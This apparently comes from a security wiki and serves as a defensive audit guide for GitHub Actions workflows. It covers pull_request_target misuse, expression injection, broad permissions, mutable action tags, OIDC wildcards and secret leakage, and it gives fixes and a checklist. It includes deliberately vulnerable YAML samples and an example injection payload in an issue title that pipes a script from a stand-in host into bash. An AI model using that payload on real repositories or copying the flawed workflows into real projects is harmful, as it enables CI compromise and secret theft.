---
title: GitHub Actions workflow — source audit
slug: github-actions-workflow-source-audit
aliases: [github-actions-audit, workflows-audit]
---

{% raw %}

> **TL;DR:** GitHub Actions workflows are YAML programs running with secrets, OIDC tokens, and write access to the repo. Source-audit risks: `pull_request_target` with checkout of attacker fork, `${{ }}` expression injection from issue titles / PR bodies, `permissions:` defaulted broad, third-party actions pinned by tag (mutable), and reusable workflows trusting their inputs. Companion to [[gha-oidc-sub-claim-wildcards]] and [[tj-actions-tag-mutation]].

## Where to look

```bash
find . -path '*/.github/workflows/*.yml' -o -path '*/.github/workflows/*.yaml'
grep -nE 'pull_request_target|workflow_run|workflow_dispatch|repository_dispatch|schedule:' .github/workflows/*
grep -nE '\$\{\{' .github/workflows/*
grep -nE 'permissions:' .github/workflows/*
grep -nE 'uses:.*@' .github/workflows/*
```

## Bug class 1 — `pull_request_target` + checkout of PR head

The flagship GitHub Actions security bug.

```yaml
# BAD
on: pull_request_target          # ← runs in the base-repo context, with secrets
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← attacker's code
      - run: npm install && npm test                       # ← runs attacker code with secrets
```

`pull_request_target` runs with secrets and write access. Checking out the PR head executes the attacker's code in that context.

Fix: use `pull_request` (no secrets) for untrusted code paths. If you need the secrets, split into two workflows: one that builds untrusted code without secrets, one that uses the build artefact with secrets.

## Bug class 2 — expression injection from event data

```yaml
# BAD
- name: Comment
  run: echo "Hello ${{ github.event.issue.title }}"
```

Issue titles can contain backticks, `$()`, semicolons. A title like `` "$(curl evil/x.sh | bash) `` → shell injection. The expression is interpolated *before* shell evaluation.

Fix: pass through `env:`:
```yaml
- name: Comment
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Hello $TITLE"
```

The shell expands `$TITLE` after the env is set, no string injection into the bash source.

Where this bites:
- Issue title / body.
- PR title / body.
- PR head ref name (`refs/heads/$(whoami)-test`).
- Commit message.

## Bug class 3 — `permissions:` too broad

```yaml
# BAD — default write-all
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    # no permissions: block → workflow has GITHUB_TOKEN write to contents
    steps:
      - uses: actions/checkout@v4
      - run: ./untrusted-script.sh
```

`GITHUB_TOKEN` defaults vary by repo setting; many orgs still default to "write". A compromised action with default-write token can push to the repo, modify workflows, release.

Fix:
```yaml
permissions:
  contents: read
  pull-requests: write    # only what's needed
```

Set repo default to `read-all` in org settings: Actions → General → Workflow permissions → Read repository contents and packages permissions.

## Bug class 4 — third-party action pinned to a tag

```yaml
- uses: some-org/some-action@v3          # BAD — tag is mutable
```

Tags can be force-pushed. The `tj-actions/changed-files` 2025 incident ([[tj-actions-tag-mutation]]) showed that an attacker who gains write access to a popular action can ship malicious code to thousands of downstream consumers in minutes.

Fix: pin to a *commit SHA*.
```yaml
- uses: some-org/some-action@a1b2c3d4e5f6a7b8c9d0...  # immutable
```

For first-party actions you own, tagging is fine because you control the tag.

## Bug class 5 — reusable workflows trusting their inputs

```yaml
# .github/workflows/reusable.yml
on:
  workflow_call:
    inputs:
      target:
        type: string
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh "${{ inputs.target }}"      # BAD — same expression-injection bug
```

`workflow_call` from a less-trusted caller can supply attacker-controlled `inputs.target`. Sanitise inputs with `env:` or strict regex.

## Bug class 6 — OIDC sub-claim wildcards

If your workflow exchanges its GitHub OIDC token for cloud credentials, the cloud trust policy uses `sub` claim matching.

```json
"Condition": {
  "StringLike": {
    "token.actions.githubusercontent.com:sub": "repo:my-org/*:*"      // BAD — wildcard
  }
}
```

A wildcard like `repo:my-org/*:*` lets *any* workflow in *any* repo in `my-org` assume the role. A compromised low-value repo's workflow takes the high-value role.

Fix: pin `sub` to specific repo + branch + environment.
```json
"sub": "repo:my-org/my-repo:ref:refs/heads/main"
```

See [[gha-oidc-sub-claim-wildcards]].

## Bug class 7 — secrets in logs

```yaml
- run: echo "API_KEY=${{ secrets.API_KEY }}"      # BAD
```

Actions auto-redact secrets in logs *by exact-string match*. Echoing a base64-decoded variant or concatenation defeats it.

Audit:
```bash
grep -rn 'secrets\.\|toJSON(secrets)\|env\..*SECRET' .github/workflows/
```

`toJSON(secrets)` to inspect available secrets — never legitimate.

## Bug class 8 — `workflow_run` chain trust

```yaml
on:
  workflow_run:
    workflows: [Build]
    types: [completed]
```

`workflow_run` lets one workflow trigger another. If the triggering workflow can be influenced by attackers (e.g., it ran for a PR), the receiving workflow inherits that taint.

The classic chain: a PR runs the "Build" workflow (no secrets), which generates an artefact; "Deploy" workflow (with secrets) is triggered by `workflow_run` and downloads the artefact and runs `npm install` over it — executing attacker code.

Fix: never run untrusted code in workflows triggered by `workflow_run` from PR-triggered workflows. Verify artefacts (cryptographic signatures) before use.

## Bug class 9 — `repository_dispatch` from external

`repository_dispatch` accepts events from any caller with `repo` token. If you've leaked any PAT with `repo` scope, anyone can fire your dispatch.

## Source-audit checklist

- [ ] No `pull_request_target` + checkout-PR-head + run-PR-code pattern.
- [ ] Every `${{ }}` interpolation of event data passes through `env:` before shell use.
- [ ] Every workflow declares minimal `permissions:`.
- [ ] All third-party actions pinned to commit SHA.
- [ ] Reusable workflows treat inputs as untrusted.
- [ ] OIDC trust policies use tight `sub` matchers.
- [ ] No `secrets.` interpolation into shell commands directly.
- [ ] No untrusted artefacts downloaded and executed in privileged workflows.
- [ ] `repository_dispatch` paths have additional verification.

## Tools

- [zizmor](https://github.com/woodruffw/zizmor) — security linter for GitHub Actions.
- [actionlint](https://github.com/rhysd/actionlint) — general syntax + light security checks.
- [allstar](https://github.com/ossf/allstar) — org-wide policy enforcement.
- GitHub's own "Trusted publishing" and signed artefacts when available.

## References
- [GitHub — Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Google — Adnan Khan's writeups on Actions abuse](https://adnanthekhan.com/)
- [OWASP — Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [SLSA](https://slsa.dev/)
- See also: [[gha-oidc-sub-claim-wildcards]], [[tj-actions-tag-mutation]], [[gitlab-ci-attacks]], [[terraform-and-iac-source-audit]], [[k8s-manifest-source-audit]]

{% endraw %}
